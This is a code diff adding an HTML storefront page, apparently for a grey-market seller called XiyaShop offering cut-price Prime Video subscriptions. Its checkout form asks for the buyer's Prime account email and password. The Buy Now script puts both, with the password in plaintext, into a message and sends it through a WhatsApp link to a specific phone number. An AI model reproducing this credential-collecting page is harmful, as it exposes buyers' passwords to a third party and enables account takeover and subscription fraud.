@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>XiyaShop — Prime Video Subscription</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    /* =========================
+         CSS VARIABLES & RESET
+    ========================= */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --sky:        #58b9f5;
+      --sky-light:  #a8d8f8;
+      --sky-pale:   #e4f4fd;
+      --navy:       #0d1f3c;
+      --navy-mid:   #152b52;
+      --navy-deep:  #091628;
+      --blue-glow:  rgba(88,185,245,0.55);
+      --glass-bg:   rgba(255,255,255,0.07);
+      --glass-border: rgba(255,255,255,0.15);
+      --silver:     #cce8fa;
+      --white:      #ffffff;
+      --accent:     #00c2ff;
+      --danger:     #ff5a5a;
+      --gold:       #f9d55c;
+      --font-main:  'Outfit', sans-serif;
+      --font-sub:   'Poppins', sans-serif;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--font-main);
+      background: var(--navy-deep);
+      color: var(--white);
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* =========================
+         ANIMATED BACKGROUND
+    ========================= */
+    .bg-scene {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+      overflow: hidden;
+    }
+
+    .bg-scene::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 80% 60% at 20% 10%, rgba(0,150,255,0.22) 0%, transparent 60%),
+        radial-gradient(ellipse 60% 50% at 80% 80%, rgba(0,80,200,0.18) 0%, transparent 60%),
+        radial-gradient(ellipse 100% 70% at 50% 50%, rgba(10,30,70,1) 0%, #091628 100%);
+    }
+
+    .bg-scene::after {
+      content: '';
+      position: absolute;
+      top: -30%;
+      left: -20%;
+      width: 140%;
+      height: 80%;
+      background: radial-gradient(ellipse at 40% 40%, rgba(0,194,255,0.12) 0%, transparent 55%);
+      animation: driftGlow 10s ease-in-out infinite alternate;
+    }
+
+    @keyframes driftGlow {
+      from { transform: translateY(0) scale(1); opacity: 0.8; }
+      to   { transform: translateY(40px) scale(1.05); opacity: 1; }
+    }
+
+    /* =========================
+         FLOATING PARTICLES
+    ========================= */
+    #particles { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+
+    /* =========================
+         PAGE WRAPPER
+    ========================= */
+    .page {
+      position: relative;
+      z-index: 1;
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 48px 20px 80px;
+    }
+
+    /* =========================
+         PAGE HEADER
+    ========================= */
+    .header {
+      text-align: center;
+      margin-bottom: 56px;
+      animation: fadeSlideDown 0.8s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    @keyframes fadeSlideDown {
+      from { opacity: 0; transform: translateY(-28px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .header-brand {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      color: var(--sky);
+      margin-bottom: 18px;
+      font-family: var(--font-sub);
+      opacity: 0.85;
+    }
+
+    .prime-logo-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 10px;
+    }
+
+    .prime-icon {
+      width: 44px;
+      height: 44px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #00a8e0, #006cb3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 24px rgba(0,168,224,0.45);
+      flex-shrink: 0;
+    }
+
+    .prime-icon svg { width: 26px; height: 26px; fill: white; }
+
+    .header-title {
+      font-size: clamp(22px, 5vw, 34px);
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      background: linear-gradient(135deg, #ffffff 0%, #a8d8f8 60%, #58b9f5 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      line-height: 1.15;
+    }
+
+    .header-subtitle {
+      font-size: clamp(12px, 2.5vw, 14px);
+      color: var(--sky-light);
+      font-weight: 500;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      margin-top: 8px;
+      font-family: var(--font-sub);
+      opacity: 0.75;
+    }
+
+    .divider {
+      margin: 24px auto;
+      width: 120px;
+      height: 1.5px;
+      background: linear-gradient(90deg, transparent, var(--sky), transparent);
+      position: relative;
+    }
+
+    .divider::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 10px var(--accent);
+    }
+
+    /* =========================
+         SECTION LABELS
+    ========================= */
+    .section-label {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--sky);
+      margin-bottom: 20px;
+      font-family: var(--font-sub);
+      opacity: 0.8;
+    }
+
+    /* =========================
+         PRIME VIDEO PLANS SECTION
+    ========================= */
+    .plans-section {
+      margin-bottom: 44px;
+      animation: fadeSlideUp 0.8s 0.15s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    @keyframes fadeSlideUp {
+      from { opacity: 0; transform: translateY(32px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .plans-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 18px;
+    }
+
+    .plan-card {
+      background: var(--glass-bg);
+      border: 1.5px solid var(--glass-border);
+      border-radius: 22px;
+      padding: 30px 26px;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease;
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+    }
+
+    .plan-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(88,185,245,0.08) 0%, transparent 60%);
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+
+    .plan-card:hover::before { opacity: 1; }
+    .plan-card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 20px 60px rgba(0,150,255,0.2);
+      border-color: rgba(88,185,245,0.4);
+    }
+
+    .plan-card.active {
+      border-color: var(--sky);
+      box-shadow: 0 0 0 1px rgba(88,185,245,0.3), 0 20px 60px rgba(0,150,255,0.25);
+      background: rgba(88,185,245,0.1);
+    }
+
+    .plan-card.active::before { opacity: 1; }
+
+    .plan-badge {
+      position: absolute;
+      top: 18px;
+      right: 18px;
+      background: linear-gradient(135deg, #00c2ff, #0077cc);
+      color: white;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      padding: 4px 10px;
+      border-radius: 50px;
+      text-transform: uppercase;
+      font-family: var(--font-sub);
+    }
+
+    .plan-duration {
+      font-size: 13px;
+      color: var(--sky-light);
+      font-weight: 500;
+      margin-bottom: 6px;
+      letter-spacing: 0.5px;
+    }
+
+    .plan-name {
+      font-size: clamp(20px, 4vw, 26px);
+      font-weight: 800;
+      color: var(--white);
+      margin-bottom: 10px;
+      line-height: 1.1;
+    }
+
+    .plan-devices {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: var(--sky-light);
+      font-weight: 500;
+      background: rgba(88,185,245,0.1);
+      border: 1px solid rgba(88,185,245,0.2);
+      border-radius: 50px;
+      padding: 4px 12px;
+      margin-bottom: 22px;
+    }
+
+    .plan-devices svg { width: 13px; height: 13px; fill: var(--sky); }
+
+    .plan-price {
+      font-size: clamp(34px, 7vw, 44px);
+      font-weight: 800;
+      background: linear-gradient(135deg, #ffffff, #58b9f5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -1px;
+      line-height: 1;
+    }
+
+    .plan-price span {
+      font-size: 18px;
+      font-weight: 600;
+      vertical-align: top;
+      margin-top: 6px;
+      display: inline-block;
+    }
+
+    .plan-select-indicator {
+      margin-top: 20px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--sky);
+      opacity: 0;
+      transition: opacity 0.3s;
+      font-family: var(--font-sub);
+    }
+
+    .plan-card.active .plan-select-indicator { opacity: 1; }
+
+    .plan-select-indicator .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 8px var(--accent);
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50%       { transform: scale(1.4); opacity: 0.7; }
+    }
+
+    /* =========================
+         FEATURES SECTION
+    ========================= */
+    .features-section {
+      margin-bottom: 44px;
+      animation: fadeSlideUp 0.8s 0.25s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    .features-card {
+      background: var(--glass-bg);
+      border: 1.5px solid var(--glass-border);
+      border-radius: 22px;
+      padding: 32px 28px;
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+    }
+
+    .feature-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      padding: 14px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+      transition: background 0.2s;
+    }
+
+    .feature-item:last-child { border-bottom: none; padding-bottom: 0; }
+    .feature-item:first-child { padding-top: 0; }
+
+    .feature-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 15px;
+      margin-top: 1px;
+    }
+
+    .feature-icon.yes {
+      background: rgba(0,200,130,0.12);
+      border: 1px solid rgba(0,200,130,0.25);
+      color: #00c882;
+    }
+
+    .feature-icon.no {
+      background: rgba(255,90,90,0.1);
+      border: 1px solid rgba(255,90,90,0.2);
+      color: var(--danger);
+    }
+
+    .feature-text {
+      font-size: clamp(13px, 2.5vw, 14.5px);
+      color: rgba(255,255,255,0.85);
+      line-height: 1.6;
+      font-weight: 400;
+    }
+
+    /* =========================
+         NOTICE / WARNING SECTION
+    ========================= */
+    .notice-section {
+      margin-bottom: 44px;
+      animation: fadeSlideUp 0.8s 0.3s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    .notice-box {
+      border-radius: 18px;
+      padding: 22px 26px;
+      background: linear-gradient(135deg, rgba(255,90,90,0.08), rgba(88,185,245,0.06));
+      border: 1.5px solid rgba(255,90,90,0.22);
+      display: flex;
+      align-items: flex-start;
+      gap: 16px;
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(255,90,90,0.07), inset 0 0 40px rgba(88,185,245,0.03);
+    }
+
+    .notice-icon-wrap {
+      width: 38px;
+      height: 38px;
+      border-radius: 12px;
+      background: rgba(255,90,90,0.12);
+      border: 1px solid rgba(255,90,90,0.25);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 18px;
+    }
+
+    .notice-text {
+      font-size: clamp(13px, 2.5vw, 14px);
+      line-height: 1.65;
+      color: rgba(255,255,255,0.82);
+      font-weight: 400;
+      padding-top: 2px;
+    }
+
+    .notice-text strong { color: #ff8a8a; font-weight: 600; }
+
+    /* =========================
+         ACCOUNT INPUT SECTION
+    ========================= */
+    .input-section {
+      margin-bottom: 44px;
+      animation: fadeSlideUp 0.8s 0.35s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    .input-card {
+      background: var(--glass-bg);
+      border: 1.5px solid var(--glass-border);
+      border-radius: 22px;
+      padding: 32px 28px;
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    .input-group:last-child { margin-bottom: 0; }
+
+    .input-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--sky-light);
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+      font-family: var(--font-sub);
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    .input-icon {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 18px;
+      height: 18px;
+      color: rgba(88,185,245,0.5);
+      pointer-events: none;
+    }
+
+    .input-field {
+      width: 100%;
+      background: rgba(255,255,255,0.05);
+      border: 1.5px solid rgba(255,255,255,0.1);
+      border-radius: 14px;
+      padding: 15px 16px 15px 44px;
+      font-size: 14px;
+      font-family: var(--font-main);
+      color: var(--white);
+      outline: none;
+      transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+    }
+
+    .input-field::placeholder { color: rgba(255,255,255,0.3); }
+
+    .input-field:focus {
+      border-color: var(--sky);
+      box-shadow: 0 0 0 3px rgba(88,185,245,0.15), 0 0 24px rgba(88,185,245,0.1);
+      background: rgba(88,185,245,0.05);
+    }
+
+    .toggle-pw {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: rgba(255,255,255,0.35);
+      padding: 4px;
+      transition: color 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .toggle-pw:hover { color: var(--sky); }
+
+    /* =========================
+         CHECKOUT SECTION
+    ========================= */
+    .checkout-section {
+      animation: fadeSlideUp 0.8s 0.4s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    .checkout-card {
+      background: linear-gradient(135deg, rgba(88,185,245,0.08), rgba(0,80,200,0.06));
+      border: 1.5px solid rgba(88,185,245,0.2);
+      border-radius: 22px;
+      padding: 32px 28px;
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+    }
+
+    .order-summary {
+      background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 16px;
+      padding: 20px 22px;
+      margin-bottom: 24px;
+    }
+
+    .order-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+      font-size: 14px;
+    }
+
+    .order-row:not(:last-child) { border-bottom: 1px solid rgba(255,255,255,0.05); }
+
+    .order-label {
+      color: rgba(255,255,255,0.55);
+      font-weight: 400;
+    }
+
+    .order-value {
+      color: var(--white);
+      font-weight: 600;
+    }
+
+    .order-total .order-label {
+      color: var(--sky-light);
+      font-weight: 600;
+      font-size: 15px;
+    }
+
+    .order-total .order-value {
+      font-size: 22px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #fff, #58b9f5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .no-plan-note {
+      color: rgba(255,255,255,0.35);
+      font-size: 13px;
+      text-align: center;
+      padding: 6px 0;
+    }
+
+    /* Buy Now Button */
+    .btn-buy {
+      width: 100%;
+      padding: 18px 28px;
+      border: none;
+      border-radius: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      font-family: var(--font-main);
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      background: linear-gradient(135deg, #00a8e0 0%, #0060b0 60%, #003e82 100%);
+      color: white;
+      box-shadow: 0 8px 32px rgba(0,150,220,0.35), 0 2px 0 rgba(255,255,255,0.1) inset;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .btn-buy::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%;
+      width: 60%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+      transition: left 0.5s ease;
+    }
+
+    .btn-buy:hover::before { left: 160%; }
+
+    .btn-buy:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 14px 40px rgba(0,150,220,0.45), 0 2px 0 rgba(255,255,255,0.1) inset;
+    }
+
+    .btn-buy:active { transform: translateY(-1px); }
+
+    .btn-buy-inner {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-buy svg { width: 20px; height: 20px; fill: white; }
+
+    /* Validation error */
+    .field-error {
+      display: none;
+      font-size: 11.5px;
+      color: #ff8a8a;
+      margin-top: 6px;
+      padding-left: 4px;
+      font-family: var(--font-sub);
+    }
+
+    .field-error.show { display: block; }
+
+    .input-field.err {
+      border-color: rgba(255,90,90,0.5);
+      box-shadow: 0 0 0 3px rgba(255,90,90,0.1);
+    }
+
+    /* =========================
+         TOAST
+    ========================= */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: rgba(20,40,80,0.95);
+      border: 1px solid rgba(88,185,245,0.3);
+      color: white;
+      padding: 14px 24px;
+      border-radius: 50px;
+      font-size: 13.5px;
+      font-weight: 500;
+      z-index: 9999;
+      backdrop-filter: blur(20px);
+      transition: transform 0.4s cubic-bezier(.22,1,.36,1), opacity 0.4s;
+      white-space: nowrap;
+      opacity: 0;
+    }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+
+    /* =========================
+         FOOTER BADGE
+    ========================= */
+    .footer-badge {
+      margin-top: 48px;
+      text-align: center;
+      animation: fadeSlideUp 0.8s 0.5s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    .footer-badge p {
+      font-size: 12px;
+      color: rgba(255,255,255,0.2);
+      letter-spacing: 0.5px;
+    }
+
+    .footer-badge p span { color: rgba(88,185,245,0.4); font-weight: 600; }
+
+    /* =========================
+         RESPONSIVE ADJUSTMENTS
+    ========================= */
+    @media (max-width: 600px) {
+      .page { padding: 36px 16px 70px; }
+      .plans-grid { grid-template-columns: 1fr; }
+      .input-card, .checkout-card, .features-card { padding: 24px 18px; }
+      .plan-card { padding: 24px 20px; }
+    }
+
+    @media (min-width: 601px) and (max-width: 768px) {
+      .plans-grid { grid-template-columns: repeat(2, 1fr); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ========== BACKGROUND SCENE ========== -->
+<div class="bg-scene"></div>
+<canvas id="particles"></canvas>
+
+<!-- ========== MAIN PAGE WRAPPER ========== -->
+<main class="page">
+
+  <!-- =========================
+       PAGE HEADER
+  ========================= -->
+  <header class="header">
+    <div class="header-brand">XiyaShop</div>
+    <div class="prime-logo-row">
+      <div class="prime-icon">
+        <!-- Prime Video play icon -->
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M8 5v14l11-7z"/>
+        </svg>
+      </div>
+      <h1 class="header-title">Prime Video Subscription</h1>
+    </div>
+    <p class="header-subtitle">Full Private Account</p>
+    <div class="divider"></div>
+  </header>
+
+  <!-- =========================
+       PRIME VIDEO PLANS SECTION
+  ========================= -->
+  <section class="plans-section">
+    <div class="section-label">Choose Your Plan</div>
+    <div class="plans-grid">
+
+      <!-- Plan 1 -->
+      <div class="plan-card" data-plan="1 Month • 5 Devices" data-price="99" onclick="selectPlan(this)">
+        <div class="plan-duration">Duration</div>
+        <div class="plan-name">1 Month</div>
+        <div class="plan-devices">
+          <svg viewBox="0 0 24 24"><path d="M20 3H4a2 2 0 00-2 2v11a2 2 0 002 2h3l-1 3h8l-1-3h3a2 2 0 002-2V5a2 2 0 00-2-2zm-1 13H5V6h14v10z"/></svg>
+          5 Devices
+        </div>
+        <div class="plan-price"><span>₹</span>99</div>
+        <div class="plan-select-indicator">
+          <div class="dot"></div>
+          Plan Selected
+        </div>
+      </div>
+
+      <!-- Plan 2 -->
+      <div class="plan-card" data-plan="3 Months • 5 Devices" data-price="199" onclick="selectPlan(this)">
+        <div class="plan-badge">Best Value</div>
+        <div class="plan-duration">Duration</div>
+        <div class="plan-name">3 Months</div>
+        <div class="plan-devices">
+          <svg viewBox="0 0 24 24"><path d="M20 3H4a2 2 0 00-2 2v11a2 2 0 002 2h3l-1 3h8l-1-3h3a2 2 0 002-2V5a2 2 0 00-2-2zm-1 13H5V6h14v10z"/></svg>
+          5 Devices
+        </div>
+        <div class="plan-price"><span>₹</span>199</div>
+        <div class="plan-select-indicator">
+          <div class="dot"></div>
+          Plan Selected
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- =========================
+       FEATURES SECTION
+  ========================= -->
+  <section class="features-section">
+    <div class="section-label">What's Included</div>
+    <div class="features-card">
+
+      <div class="feature-item">
+        <div class="feature-icon yes">✓</div>
+        <div class="feature-text">Activation available on fresh accounts or accounts that have never used Prime before</div>
+      </div>
+
+      <div class="feature-item">
+        <div class="feature-icon yes">✓</div>
+        <div class="feature-text">Supports high-quality <strong style="color:var(--sky-light)">4K streaming</strong> for the best viewing experience</div>
+      </div>
+
+      <div class="feature-item">
+        <div class="feature-icon yes">🍿</div>
+        <div class="feature-text">Intended only for watching movies and shows — your personal cinema experience</div>
+      </div>
+
+      <div class="feature-item">
+        <div class="feature-icon no">✗</div>
+        <div class="feature-text">Shopping-related Prime benefits are <strong style="color:#ff8a8a">not included</strong> 🛍️</div>
+      </div>
+
+      <div class="feature-item">
+        <div class="feature-icon no">✗</div>
+        <div class="feature-text">Rental and paid movie purchases are <strong style="color:#ff8a8a">not included</strong> 🚫</div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- =========================
+       IMPORTANT NOTICE SECTION
+  ========================= -->
+  <section class="notice-section">
+    <div class="notice-box">
+      <div class="notice-icon-wrap">⚠️</div>
+      <div class="notice-text">
+        <strong>Important Notice:</strong><br>
+        Violation of these usage policies may result in account termination without refund. Please use the service responsibly and within the stated guidelines.
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================
+       ACCOUNT INPUT SECTION
+  ========================= -->
+  <section class="input-section">
+    <div class="section-label">Your Account Details</div>
+    <div class="input-card">
+
+      <!-- Prime Account Email -->
+      <div class="input-group">
+        <label class="input-label" for="primeEmail">Prime Account Email</label>
+        <div class="input-wrap">
+          <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="2" y="4" width="20" height="16" rx="2"/>
+            <path d="M22 7l-10 7L2 7"/>
+          </svg>
+          <input class="input-field" type="email" id="primeEmail" placeholder="your@email.com" autocomplete="email" />
+        </div>
+        <div class="field-error" id="emailError">Please enter your Prime account email.</div>
+      </div>
+
+      <!-- Prime Password -->
+      <div class="input-group">
+        <label class="input-label" for="primePassword">Prime Password</label>
+        <div class="input-wrap">
+          <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="3" y="11" width="18" height="11" rx="2"/>
+            <path d="M7 11V7a5 5 0 0110 0v4"/>
+          </svg>
+          <input class="input-field" type="password" id="primePassword" placeholder="Enter your password" autocomplete="current-password" />
+          <button class="toggle-pw" onclick="togglePassword()" type="button" aria-label="Toggle password visibility">
+            <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+        </div>
+        <div class="field-error" id="passError">Please enter your Prime password.</div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- =========================
+       CHECKOUT SECTION
+  ========================= -->
+  <section class="checkout-section">
+    <div class="section-label">Order Summary</div>
+    <div class="checkout-card">
+
+      <div class="order-summary">
+        <div class="order-row">
+          <span class="order-label">Selected Plan</span>
+          <span class="order-value" id="summaryPlan">
+            <span class="no-plan-note">— Select a plan —</span>
+          </span>
+        </div>
+        <div class="order-row order-total">
+          <span class="order-label">Total</span>
+          <span class="order-value" id="summaryTotal">—</span>
+        </div>
+      </div>
+
+      <button class="btn-buy" onclick="handleBuyNow()">
+        <div class="btn-buy-inner">
+          <svg viewBox="0 0 24 24"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zm10 0c-1.1 0-1.99.9-1.99 2S15.9 22 17 22s2-.9 2-2-.9-2-2-2zm-17.2-14H1V2H0v2h1l3.6 7.59L3.25 14C3.09 14.37 3 14.76 3 15c0 1.1.9 2 2 2h14v-2H5.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63H19c.75 0 1.41-.41 1.75-1.03l3.58-6.49A1 1 0 0023.46 4H5.21l-.94-2H0v2h.8z"/></svg>
+          Buy Now
+        </div>
+      </button>
+
+    </div>
+  </section>
+
+  <!-- =========================
+       FOOTER BADGE
+  ========================= -->
+  <div class="footer-badge">
+    <p>Powered by <span>XiyaShop</span> · Secure &amp; Private</p>
+  </div>
+
+</main>
+
+<!-- ========== TOAST NOTIFICATION ========== -->
+<div class="toast" id="toast"></div>
+
+<!-- =========================
+     JAVASCRIPT — FUNCTIONALITY
+========================= -->
+<script>
+  /* ---------- STATE ---------- */
+  let selectedPlan = null;
+  let selectedPrice = null;
+
+  /* ---------- PLAN SELECTION ---------- */
+  function selectPlan(card) {
+    document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('active'));
+    card.classList.add('active');
+    selectedPlan  = card.dataset.plan;
+    selectedPrice = card.dataset.price;
+    updateSummary();
+  }
+
+  function updateSummary() {
+    const planEl  = document.getElementById('summaryPlan');
+    const totalEl = document.getElementById('summaryTotal');
+    if (selectedPlan) {
+      planEl.innerHTML  = `<strong>${selectedPlan}</strong>`;
+      totalEl.textContent = `₹${selectedPrice}`;
+    } else {
+      planEl.innerHTML  = `<span class="no-plan-note">— Select a plan —</span>`;
+      totalEl.textContent = '—';
+    }
+  }
+
+  /* ---------- PASSWORD TOGGLE ---------- */
+  function togglePassword() {
+    const pw  = document.getElementById('primePassword');
+    const ico = document.getElementById('eyeIcon');
+    if (pw.type === 'password') {
+      pw.type = 'text';
+      ico.innerHTML = `
+        <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
+        <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
+        <line x1="1" y1="1" x2="23" y2="23"/>`;
+    } else {
+      pw.type = 'password';
+      ico.innerHTML = `
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+        <circle cx="12" cy="12" r="3"/>`;
+    }
+  }
+
+  /* ---------- VALIDATION ---------- */
+  function validateFields() {
+    let valid = true;
+    const email = document.getElementById('primeEmail');
+    const pass  = document.getElementById('primePassword');
+    const emailErr = document.getElementById('emailError');
+    const passErr  = document.getElementById('passError');
+
+    email.classList.remove('err'); emailErr.classList.remove('show');
+    pass.classList.remove('err');  passErr.classList.remove('show');
+
+    if (!email.value.trim() || !email.value.includes('@')) {
+      email.classList.add('err'); emailErr.classList.add('show'); valid = false;
+    }
+    if (!pass.value.trim()) {
+      pass.classList.add('err'); passErr.classList.add('show'); valid = false;
+    }
+    return valid;
+  }
+
+  /* ---------- BUY NOW ---------- */
+  function handleBuyNow() {
+    if (!selectedPlan) {
+      showToast('⚡ Please select a plan first');
+      return;
+    }
+    if (!validateFields()) {
+      showToast('📋 Please fill in your account details');
+      return;
+    }
+
+    const email    = document.getElementById('primeEmail').value.trim();
+    const password = document.getElementById('primePassword').value.trim();
+
+    const message =
+`Prime Video Order
+
+Selected Plan: ${selectedPlan}
+Prime Account: ${email}
+Password: ${password}
+Price: ₹${selectedPrice}`;
+
+    const encoded = encodeURIComponent(message);
+    window.location.href = `https://wa.me/919387947130?text=${encoded}`;
+  }
+
+  /* ---------- TOAST ---------- */
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3200);
+  }
+
+  /* ---------- PARTICLES ---------- */
+  (function initParticles() {
+    const canvas = document.getElementById('particles');
+    const ctx    = canvas.getContext('2d');
+    let particles = [];
+
+    function resize() {
+      canvas.width  = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    resize();
+    window.addEventListener('resize', resize);
+
+    function randomRange(min, max) { return Math.random() * (max - min) + min; }
+
+    function createParticle() {
+      return {
+        x:     randomRange(0, canvas.width),
+        y:     randomRange(0, canvas.height),
+        r:     randomRange(0.8, 2.2),
+        vx:    randomRange(-0.15, 0.15),
+        vy:    randomRange(-0.3, -0.05),
+        alpha: randomRange(0.1, 0.45),
+        hue:   randomRange(195, 220)
+      };
+    }
+
+    for (let i = 0; i < 80; i++) particles.push(createParticle());
+
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      particles.forEach(p => {
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+        ctx.fillStyle = `hsla(${p.hue}, 90%, 75%, ${p.alpha})`;
+        ctx.fill();
+
+        p.x += p.vx;
+        p.y += p.vy;
+
+        if (p.y < -4)       p.y = canvas.height + 4;
+        if (p.x < -4)       p.x = canvas.width  + 4;
+        if (p.x > canvas.width  + 4) p.x = -4;
+      });
+      requestAnimationFrame(draw);
+    }
+    draw();
+  })();
+</script>
+
+</body>
+</html>
